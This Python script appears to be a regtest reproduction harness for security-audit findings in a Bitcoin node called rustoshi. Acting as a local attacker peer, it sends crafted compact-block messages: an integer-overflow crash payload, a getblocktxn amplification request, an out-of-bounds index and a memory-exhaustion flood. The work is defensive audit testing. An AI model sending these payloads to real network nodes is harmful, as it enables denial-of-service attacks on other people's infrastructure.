#!/usr/bin/env python3
"""Regtest repro for security audit 2026-10-28 findings C1, C2, C3, H1.

Starts a fresh rustoshi regtest node per scenario (fresh datadir under
--workdir, P2P on a free 127.0.0.1 port, no outbound peers, metrics off),
connects as a local attacker peer, and prints PASS/FAIL per scenario.
Each scenario FAILs on a node with the bug and PASSes on a fixed node.

  c1_cmpctblock_overflow     ~100-byte cmpctblock, prefilled count u64::MAX:
                             node must survive (base: panics and exits).
  c2_getblocktxn_amplify     getblocktxn repeating index 0 ~66k times: no
                             multi-MB blocktxn (base: ~13 MB response).
  c2_getblocktxn_oob         index past the block: no blocktxn, peer dropped
                             (Core Misbehaving); in-range request still served.
  c3_inflight_unbounded      150 distinct cmpctblocks, each parking a ~1 MB
                             partial block: RSS must stay bounded.
  h1_unknown_parent          cmpctblock on an unknown parent: getheaders, no
                             reconstruction / getblocktxn.

Usage: sec_compact_blocks_regtest.py --bin PATH --workdir DIR [--only NAME]
Python 3 standard library only.
"""
import argparse
import hashlib
import os
import random
import socket
import struct
import subprocess
import sys
import time

MAGIC = bytes.fromhex("fabfb5da")
GENESIS = bytes.fromhex(
    "0f9188f13cb7b2c71f2a335e3a4fc328bf5beb436012afca590b1a11466e2206")[::-1]


def sha256d(b):
    return hashlib.sha256(hashlib.sha256(b).digest()).digest()


def cs(n):
    if n < 0xFD:
        return bytes([n])
    if n <= 0xFFFF:
        return b"\xfd" + struct.pack("<H", n)
    if n <= 0xFFFFFFFF:
        return b"\xfe" + struct.pack("<I", n)
    return b"\xff" + struct.pack("<Q", n)


def frame(cmd, payload):
    return (MAGIC + cmd.encode().ljust(12, b"\0") + struct.pack("<I", len(payload))
            + sha256d(payload)[:4] + payload)


def free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    p = s.getsockname()[1]
    s.close()
    return p


class Peer:
    def __init__(self, port):
        self.s = socket.create_connection(("127.0.0.1", port), timeout=10)
        self.buf = b""

    def send(self, cmd, payload=b""):
        self.s.sendall(frame(cmd, payload))

    def recv_msgs(self, seconds):
        """Read frames for `seconds`; returns list of (cmd, len). None-terminated
        list entry ('<closed>', 0) marks a peer disconnect."""
        out = []
        end = time.time() + seconds
        while time.time() < end:
            self.s.settimeout(max(0.05, end - time.time()))
            try:
                d = self.s.recv(1 << 20)
            except socket.timeout:
                continue
            except OSError:
                out.append(("<closed>", 0))
                return out
            if not d:
                out.append(("<closed>", 0))
                return out
            self.buf += d
            while len(self.buf) >= 24:
                ln = struct.unpack("<I", self.buf[16:20])[0]
                if len(self.buf) < 24 + ln:
                    break
                cmd = self.buf[4:16].rstrip(b"\0").decode()
                payload = self.buf[24:24 + ln]
                self.buf = self.buf[24 + ln:]
                out.append((cmd, ln))
                if cmd == "ping":
                    self.send("pong", payload)
        return out

    def handshake(self):
        addr = struct.pack("<Q", 0) + b"\0" * 10 + b"\xff\xff" + bytes([127, 0, 0, 1]) + struct.pack(">H", 0)
        ver = (struct.pack("<iQq", 70016, 9, int(time.time())) + addr + addr
               + struct.pack("<Q", random.getrandbits(64)) + cs(9) + b"/attack:0/"
               + struct.pack("<i", 0) + b"\x01")
        self.send("version", ver)
        got = set()
        end = time.time() + 15
        while time.time() < end and "verack" not in got:
            for cmd, _ in self.recv_msgs(0.5):
                got.add(cmd)
                if cmd == "version":
                    self.send("verack")
                if cmd == "<closed>":
                    raise RuntimeError("closed during handshake")
        if "verack" not in got:
            raise RuntimeError("no verack")

    def close(self):
        try:
            self.s.close()
        except OSError:
            pass


def tx_bytes(script_len):
    """A 1-in 1-out legacy tx with an output script of `script_len` bytes."""
    return (struct.pack("<i", 1) + cs(1) + b"\0" * 32 + struct.pack("<I", 0xFFFFFFFF)
            + cs(4) + b"\x03\x01\x00\x00" + struct.pack("<I", 0xFFFFFFFF)
            + cs(1) + struct.pack("<q", 0) + cs(script_len) + b"\x6a" * script_len
            + struct.pack("<I", 0))


def mined_header(prev):
    """80-byte regtest header on `prev` that meets 0x207fffff."""
    merkle = os.urandom(32)
    nonce = 0
    target = 0x7fffff * (1 << (8 * (0x20 - 3)))
    while True:
        h = struct.pack("<i", 0x20000000) + prev + merkle + struct.pack("<III", int(time.time()), 0x207fffff, nonce)
        if int.from_bytes(sha256d(h), "little") <= target:
            return h
        nonce += 1


def cmpct(header, prefilled_tx, n_short_ids):
    return (header + struct.pack("<Q", random.getrandbits(64)) + cs(n_short_ids)
            + os.urandom(6 * n_short_ids) + cs(1) + cs(0) + prefilled_tx)


class Node:
    def __init__(self, binary, workdir, name):
        self.dir = os.path.join(workdir, name)
        os.makedirs(self.dir, exist_ok=False)
        self.port = free_port()
        self.rpc = free_port()
        self.log = open(os.path.join(self.dir, "node.log"), "wb")
        self.proc = subprocess.Popen(
            [binary, "--network=regtest", f"--datadir={self.dir}", f"--port={self.port}",
             f"--rpcbind=127.0.0.1:{self.rpc}", "--metrics-port=0", "--nodnsseed",
             "--loglevel=debug"],
            stdout=self.log, stderr=subprocess.STDOUT, start_new_session=True)
        end = time.time() + 120
        while time.time() < end:
            if self.proc.poll() is not None:
                raise RuntimeError(f"node exited at startup rc={self.proc.returncode}")
            try:
                socket.create_connection(("127.0.0.1", self.port), timeout=1).close()
                return
            except OSError:
                time.sleep(0.5)
        raise RuntimeError("node P2P port never opened")

    def alive(self):
        return self.proc.poll() is None

    def rss_mb(self):
        with open(f"/proc/{self.proc.pid}/status") as f:
            for line in f:
                if line.startswith("VmRSS:"):
                    return int(line.split()[1]) / 1024
        return -1

    def stop(self):
        if self.proc.poll() is None:
            self.proc.terminate()
            try:
                self.proc.wait(30)
            except subprocess.TimeoutExpired:
                self.proc.kill()
                self.proc.wait()
        self.log.close()


def count(msgs, cmd):
    return sum(1 for c, _ in msgs if c == cmd)


def c1_cmpctblock_overflow(node):
    p = Peer(node.port)
    p.handshake()
    msg = mined_header(GENESIS) + struct.pack("<Q", 1) + cs(1) + b"\xab" * 6 + b"\xff" + b"\xff" * 8
    p.send("cmpctblock", msg)
    msgs = p.recv_msgs(3)
    time.sleep(2)
    alive = node.alive()
    detail = f"msg={len(msg)}B node_alive={alive} rc={node.proc.returncode} peer_reply={msgs}"
    return alive, detail


def c2_getblocktxn_amplify(node):
    p = Peer(node.port)
    p.handshake()
    n = 66_665
    req = GENESIS + cs(n) + cs(0) + (b"\xfe" + struct.pack("<I", 0xFFFFFFFF)) * (n - 1)
    p.send("getblocktxn", req)
    msgs = p.recv_msgs(8)
    resp = sum(ln for c, ln in msgs if c == "blocktxn")
    ok = node.alive() and resp < 4096
    return ok, f"request={len(req)}B blocktxn_bytes={resp} node_alive={node.alive()}"


def c2_getblocktxn_oob(node):
    p = Peer(node.port)
    p.handshake()
    p.send("getblocktxn", GENESIS + cs(1) + cs(0))  # control: index 0 exists
    ctrl = p.recv_msgs(3)
    p.send("getblocktxn", GENESIS + cs(1) + cs(5))  # genesis has 1 tx
    oob = p.recv_msgs(5)
    served = count(ctrl, "blocktxn") == 1
    dropped = "<closed>" in [c for c, _ in oob] and count(oob, "blocktxn") == 0
    return served and dropped, f"control_blocktxn={count(ctrl, 'blocktxn')} oob_reply={oob}"


def c3_inflight_unbounded(node):
    p = Peer(node.port)
    p.handshake()
    big = tx_bytes(1_000_000)
    time.sleep(1)
    before = node.rss_mb()
    n, msgs = 150, []
    for i in range(n):
        p.send("cmpctblock", cmpct(mined_header(GENESIS), big, 1))
        msgs += p.recv_msgs(0.05)
    msgs += p.recv_msgs(5)
    after = node.rss_mb()
    growth = after - before
    gbt, gd = count(msgs, "getblocktxn"), count(msgs, "getdata")
    # Bounded memory, and each replaced partial is asked for in full (getdata)
    # rather than silently dropped.
    ok = node.alive() and growth < 60 and gd >= n - 1
    return ok, (f"sent={n}x{len(big) // 1000}kB getblocktxn_replies={gbt} getdata_replies={gd} "
                f"rss_before={before:.0f}MB rss_after={after:.0f}MB growth={growth:.0f}MB")


def h1_unknown_parent(node):
    p = Peer(node.port)
    p.handshake()
    p.recv_msgs(2)  # drain post-handshake chatter (its own getheaders etc.)
    p.send("cmpctblock", cmpct(mined_header(os.urandom(32)), tx_bytes(10), 1))
    msgs = p.recv_msgs(4)
    ok = count(msgs, "getblocktxn") == 0 and count(msgs, "getheaders") >= 1
    return ok, f"replies={msgs}"


SCENARIOS = [c1_cmpctblock_overflow, c2_getblocktxn_amplify, c2_getblocktxn_oob,
             c3_inflight_unbounded, h1_unknown_parent]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--bin", required=True)
    ap.add_argument("--workdir", required=True)
    ap.add_argument("--only")
    a = ap.parse_args()
    os.makedirs(a.workdir, exist_ok=True)
    fails = 0
    for sc in SCENARIOS:
        if a.only and sc.__name__ != a.only:
            continue
        node = Node(a.bin, a.workdir, sc.__name__)
        try:
            ok, detail = sc(node)
        except Exception as e:  # noqa: BLE001 - report, keep going
            ok, detail = False, f"error: {e!r} node_alive={node.alive()}"
        finally:
            node.stop()
        fails += not ok
        print(f"{'PASS' if ok else 'FAIL'} {sc.__name__}: {detail}", flush=True)
    print(f"{len(SCENARIOS) - fails if not a.only else int(fails == 0)} passed, {fails} failed")
    return 1 if fails else 0


if __name__ == "__main__":
    sys.exit(main())
